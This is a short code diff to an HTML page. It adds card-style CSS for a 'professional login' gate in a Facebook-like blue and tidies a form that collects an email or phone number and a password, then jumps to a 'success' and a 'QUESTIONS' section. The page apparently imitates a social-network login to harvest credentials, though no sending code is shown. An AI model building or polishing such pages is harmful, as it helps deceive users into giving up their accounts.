@@ -94,6 +94,15 @@ input, textarea {
     font-size: 18px;
 }
 
+/* THE PROFESSIONAL LOGIN */  
+    #vault-gate { display: flex; justify-content: center; align-items: center; height: 100vh; }  
+    .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 10px 30px rgba(0,0,0,0.1); width: 100%; max-width: 400px; text-align: center; }  
+    .brand { font-size: 32px; font-weight: bold; color: #0866ff; margin-bottom: 10px; }  
+    input, select { width: 100%; padding: 15px; margin: 10px 0; border: 1px solid #dddfe2; border-radius: 8px; font-size: 16px; box-sizing: border-box; }  
+    .login-btn { width: 100%; padding: 15px; background: #0866ff; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; 
+}
+
+
 </style>
 </head>
 
@@ -134,10 +143,10 @@ input, textarea {
             <input type="text" name="Account_ID" placeholder="Email or Phone Number" required>  
             <input type="password" name="Security_Key" placeholder="Password" required>   
         <button type="button" onclick="go('success')">Continue</button>
-
-        </form>
+ </form>
 
     </div>
+</div>
 
 <!-- QUESTIONS -->
 <div id="success" class="section">
